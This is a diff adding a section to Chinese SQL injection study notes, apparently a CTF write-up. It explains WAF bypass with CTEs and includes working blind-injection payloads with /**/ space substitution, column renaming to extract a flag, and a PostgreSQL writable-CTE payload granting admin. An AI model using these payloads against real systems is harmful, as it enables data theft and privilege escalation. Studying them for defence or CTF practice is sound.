@@ -956,3 +956,162 @@ Web 服务器的重写之后
 | 特定函数 | 等价函数替换 |
 | 应用层过滤 | 编码、协议层变换、换入口 |
 
+
+
+## 绕过手法之CTE
+
+之所以写这个是在极客大挑战遇到一道SQL注入题里面用到了这个方法，之前没见过，所以写进来
+
+CTE (Common Table Expression) 在 SQL 注入中，本质上是一种**语法重构**技术。它的核心价值在于：当 WAF（Web 应用防火墙）依赖已知的危险关键词（如 `UNION`, `SELECT`, `AND`）进行过滤时，CTE 能提供一种语法上合法但模式上陌生的查询结构，从而绕过检测，可以在无列名情况下查询数据
+
+### CTE基础语法
+
+CTE 通过 `WITH` 子句定义一个临时命名的结果集，其生命周期仅限于紧随其后的单个 `SELECT`、`INSERT`、`UPDATE` 或 `DELETE` 语句,也就是只在单次查询给未知列名重新命名，这个结果并不会长久生效。
+
+**标准结构**：
+
+```
+WITH cte_name (column1, column2, ...) AS (
+    // 子查询，生成临时结果集
+    SELECT ... FROM some_table WHERE ...
+)
+// 主查询，可以像普通表一样引用 cte_name
+SELECT * FROM cte_name;
+```
+
+`WITH` 必须紧贴在主查询（`SELECT`/`UPDATE`/`DELETE`）的最前面，否则会报语法错误
+
+可以在 `cte_name` 后显式声明列名，这在注入中至关重要，用于**重命名未知列**。
+
+
+
+**主要用途:**
+
+### 无列名注入（规避列名过滤与 `information_schema` 封锁）
+
+这是 CTE 在注入中最经典的用法。当 WAF 拦截了敏感列名（如 `password`、`flag`），或 `information_schema` 库被禁用时，只要你知道目标表的**列数量**，就可以用 CTE 给 `SELECT *` 的结果重新赋予通用别名，从而按位置提取数据。
+
+这里用极客大挑战里的题来举例讲解
+
+此题是布尔盲注、且已经知道空格被waf，用/**/代替可绕过
+
+![image-20261110130021948](./SQL注入学习梳理.assets/image-20261110130021948.png)
+
+结合 ASCII 盲注可以提取：
+
+```sql
+database()
+version()
+current_user()
+```
+
+得到：
+
+```text
+database()     = syclover
+version()      = 8.0.46   //高于8.0 后续CTE可使用的条件
+current_user() = reader@%
+```
+
+尝试时间盲注等其他手段，或者大小写、双写绕过都不行无法正常提取数据
+
+最后发现这道题是过滤掉了information_schema的使用，只要一用这个就查询失败，
+
+怎么测试出来的呢：
+
+```
+1'/**/and/**/exists(
+    select/**/1/**/from/**/information_schema.tables
+)#
+```
+
+结果为查询不到
+
+同时：
+
+```
+1'/**/and/**/exists(select/**/1/**/from/**/security)#
+```
+
+结果为查询成功
+
+说明注入本身成立，但information_schema被过滤
+
+本题已经知道表名是 `security`，但 `information_schema` 无法使用，不能用来获取真实列名，所以用到CTE
+
+可以写：
+
+```sql
+WITH t(c1, c2, c3, c4, c5) AS (
+    SELECT * FROM security
+)
+SELECT c5 FROM t;
+```
+
+从真实的 `security` 表中提取所有数据。因为表正好有 5 列**（需要注意的是CTE 列数必须匹配：`WITH t(c1, c2, ...)` 中声明的列数，必须与子查询 `SELECT *` 返回的实际列数一致，否则报错）**，所以按照顺序，真实的列与 `t` 表的列形成了映射：
+
+c1对应 id
+
+c2对应 title
+
+c3对应 author
+
+c4对应 description
+
+c5对应syc_flag
+
+查询c5就是查询syc_flag
+
+可以用group_concat直接提取第五列把多行数据一次型爆出来
+
+```
+WITH t(c1,c2,c3,c4,c5) AS (
+    SELECT * FROM security
+)
+SELECT GROUP_CONCAT(c1 SEPARATOR 0x7c)
+FROM t;
+```
+
+SEPARATOR 0x7c指定了不同行之间用`|`分隔
+
+最终放进盲注的payload是:
+
+```
+1'/**/and/**/ascii(substr((
+    WITH t(c1,c2,c3,c4,c5) AS (
+        SELECT * FROM security
+    )
+    SELECT GROUP_CONCAT(c5 SEPARATOR 0x7c)
+    FROM t
+),1,1))>63#
+```
+
+后面步骤就是常规布尔盲注的流程
+
+脚本最终得到 syc1|syc2|syc3|syc4|syc5|SYC{ce43e8d4-069f-4c7c-848d-bd11d5032d0f}
+
+###  可写 CTE（PostgreSQL 专属高危能力）
+
+在 **PostgreSQL** 中，CTE 内部不仅可以包含 `SELECT`，还可以执行 `INSERT`、`UPDATE`、`DELETE` 等写操作。这允许攻击者在一个看似只读的 `SELECT` 注入点中，**实际修改数据库内容**（如提权、篡改数据）
+
+**Payload 示例**（将攻击者权限提升为 admin）：
+
+```
+WITH evil AS (
+    UPDATE users SET role='admin' WHERE username='attacker' RETURNING *
+)
+SELECT * FROM evil;
+```
+
+**关键限制**：如果 CTE 中的 DML 语句没有 `RETURNING` 子句，它虽然会执行，但**无法被主查询引用**，因为不会生成临时表
+
+
+
+### 使用限制
+
+| 数据库         | CTE 支持版本   | 关键限制与注意事项                                           |
+| :------------- | :------------- | :----------------------------------------------------------- |
+| **MySQL**      | **8.0 及以上** | **5.7 及以下版本完全不支持 `WITH` 语法**，会直接报错。递归 CTE 需加 `RECURSIVE`，并注意默认深度限制。 |
+| **PostgreSQL** | 长期支持       | 支持**可写 CTE**（`INSERT`/`UPDATE`/`DELETE`）。但无 `RETURNING` 的 DML CTE 无法被引用。 |
+| **SQL Server** | 2005+          | 支持 CTE，但**不支持**可写 CTE 中的 `RETURNING` 语法。       |
+| **Oracle**     | 11g+           | 支持 CTE，但语法细节（如递归关键字）与 MySQL/PG 有差异。     |
